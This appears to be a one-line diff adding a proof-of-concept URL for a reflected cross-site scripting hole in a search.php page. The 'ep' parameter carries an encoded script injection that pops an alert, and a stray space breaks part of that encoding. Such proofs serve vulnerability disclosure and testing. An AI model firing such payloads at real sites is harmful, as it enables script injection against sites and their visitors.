@@ -1,0 +1,1 @@
+http://www.example.com/search.php?q=&amp;r=0&amp;s=Search&amp;in=1&amp;ex=1&amp;ep= %27%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript% 3E&amp;be=1&amp;t=1&amp;adv=1&amp;type=all&amp;on=new&amp;time=any&amp;author=
